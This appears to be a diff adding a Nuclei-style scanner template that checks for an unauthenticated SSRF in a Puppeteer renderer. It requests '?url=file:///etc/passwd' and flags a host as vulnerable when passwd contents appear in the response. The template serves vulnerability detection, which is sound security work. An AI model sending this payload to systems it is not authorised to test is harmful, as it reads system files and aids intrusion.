@@ -1,0 +1,18 @@
+id: poc-puppeteer-renderer-unauth-ssrf
+info:
+  name: Puppeteer Renderer Unauthenticated SSRF Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: ssrf
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/?url=file:///etc/passwd"
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "root:"
+          - "</pre>"
+          - "/bin"
+        part: body
